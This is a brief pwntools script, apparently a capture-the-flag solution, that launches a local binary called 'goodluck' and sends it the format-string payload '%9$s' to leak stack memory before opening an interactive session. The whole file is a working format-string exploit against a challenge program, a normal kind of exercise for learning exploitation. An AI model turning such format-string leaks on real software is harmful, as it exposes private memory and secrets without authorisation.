from pwn import *

context(arch='amd64', os='linux')
goodluck = ELF('./goodluck')
sh = process('./goodluck')

payload = b"%9$s"
print(payload)
# gdb.attach(sh)
sh.sendline(payload)
print(sh.recv())
sh.interactive()